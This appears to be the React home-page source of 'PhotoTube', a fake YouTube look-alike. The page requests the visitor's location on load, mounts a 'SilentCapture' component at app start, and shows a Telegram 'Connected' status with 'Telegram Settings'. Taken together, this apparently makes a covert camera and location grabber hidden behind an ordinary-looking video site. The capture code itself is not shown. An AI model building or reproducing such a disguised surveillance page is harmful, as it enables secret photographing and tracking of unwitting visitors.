import { useState, useEffect } from 'react';
import { Menu, Search, Mic, Video, Bell, Camera, MapPin, Settings, History, Clock, Home, Compass, Play } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { CameraModal } from '@/components/camera-modal';
import { SilentCapture } from '@/components/silent-capture';
import { VideoGrid } from '@/components/video-grid';
import { locationService, type LocationData } from '@/lib/location';

export default function HomePage() {
  const [isCameraModalOpen, setIsCameraModalOpen] = useState(false);
  const [showSilentCapture, setShowSilentCapture] = useState(true);
  const [location, setLocation] = useState<LocationData | null>(null);
  const [locationStatus, setLocationStatus] = useState('Getting location...');

  useEffect(() => {
    getCurrentLocation();
  }, []);

  const getCurrentLocation = async () => {
    try {
      const locationData = await locationService.getCurrentLocation();
      setLocation(locationData);
      setLocationStatus('Location Ready');
    } catch (error) {
      setLocationStatus('Location Failed');
    }
  };

  return (
    <div className="bg-youtube-dark text-white font-inter min-h-screen">
      {/* Header */}
      <header className="bg-youtube-dark border-b border-youtube-elevated sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <Button variant="ghost" size="icon" className="md:hidden text-white hover:text-gray-300">
                <Menu className="h-5 w-5" />
              </Button>
              <div className="flex items-center space-x-2">
                <div className="text-youtube-red text-2xl">
                  <svg viewBox="0 0 24 24" className="w-8 h-8 fill-current">
                    <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
                  </svg>
                </div>
                <span className="text-xl font-semibold">PhotoTube</span>
              </div>
            </div>
            
            <div className="hidden md:flex flex-1 max-w-2xl mx-8">
              <div className="flex w-full">
                <Input 
                  type="text" 
                  placeholder="Search videos..." 
                  className="flex-1 bg-youtube-secondary border border-youtube-elevated rounded-l-full px-6 py-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 rounded-r-none"
                />
                <Button className="bg-youtube-elevated border border-l-0 border-youtube-elevated rounded-r-full px-6 py-2 hover:bg-gray-600 rounded-l-none">
                  <Search className="h-4 w-4 text-gray-300" />
                </Button>
              </div>
              <Button className="ml-4 bg-youtube-elevated rounded-full p-2 hover:bg-gray-600" size="icon">
                <Mic className="h-4 w-4 text-gray-300" />
              </Button>
            </div>

            <div className="flex items-center space-x-4">
              {/* Location Status */}
              <div className="hidden sm:flex items-center space-x-2 text-sm">
                <MapPin className={`h-4 w-4 ${location ? 'text-green-400' : 'text-red-400'}`} />
                <span className="text-gray-300">{locationStatus}</span>
              </div>
              
              {/* Telegram Status */}
              <div className="hidden sm:flex items-center space-x-2 text-sm">
                <svg viewBox="0 0 24 24" className="w-4 h-4 fill-current text-blue-400">
                  <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
                </svg>
                <span className="text-gray-300">Connected</span>
              </div>

              <Button variant="ghost" size="icon" className="text-white hover:text-gray-300">
                <Video className="h-5 w-5" />
              </Button>
              <Button variant="ghost" size="icon" className="text-white hover:text-gray-300">
                <Bell className="h-5 w-5" />
              </Button>
              <Button size="icon" className="w-8 h-8 bg-youtube-red rounded-full flex items-center justify-center">
                <span className="text-sm font-semibold">U</span>
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="flex">
        {/* Sidebar */}
        <aside className="hidden md:block w-64 bg-youtube-dark border-r border-youtube-elevated h-screen sticky top-16">
          <nav className="p-4 space-y-2">
            <Button variant="ghost" className="w-full justify-start bg-youtube-elevated text-white">
              <Home className="mr-3 h-5 w-5" />
              Home
            </Button>
            <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
              <Compass className="mr-3 h-5 w-5" />
              Explore
            </Button>
            <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
              <Play className="mr-3 h-5 w-5" />
              Subscriptions
            </Button>
            
            <hr className="border-youtube-elevated my-4" />
            
            <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
              <Camera className="mr-3 h-5 w-5" />
              My Captures
            </Button>
            <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
              <History className="mr-3 h-5 w-5" />
              History
            </Button>
            <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
              <Clock className="mr-3 h-5 w-5" />
              Watch Later
            </Button>
            
            <hr className="border-youtube-elevated my-4" />
            
            <div className="space-y-2">
              <h3 className="text-sm font-semibold text-gray-400 px-2">SETTINGS</h3>
              <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
                <Settings className="mr-3 h-5 w-5" />
                Preferences
              </Button>
              <Button variant="ghost" className="w-full justify-start hover:bg-youtube-secondary text-gray-300 hover:text-white">
                <svg viewBox="0 0 24 24" className="mr-3 h-5 w-5 fill-current">
                  <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
                </svg>
                Telegram Settings
              </Button>
            </div>
          </nav>
        </aside>

        {/* Main Content */}
        <main className="flex-1 p-4 md:p-6">
          <VideoGrid />
        </main>
      </div>

      {/* Floating Capture Button */}
      <Button
        onClick={() => setIsCameraModalOpen(true)}
        className="fixed bottom-6 right-6 w-16 h-16 bg-youtube-red hover:bg-red-600 rounded-full shadow-2xl flex items-center justify-center transition-all duration-300 transform hover:scale-110 z-50"
        size="icon"
      >
        <Camera className="text-white text-2xl" size={24} />
      </Button>

      {/* Silent Capture on App Start */}
      {showSilentCapture && (
        <SilentCapture onComplete={() => setShowSilentCapture(false)} />
      )}

      {/* Camera Modal */}
      <CameraModal 
        isOpen={isCameraModalOpen}
        onClose={() => setIsCameraModalOpen(false)}
      />
    </div>
  );
}
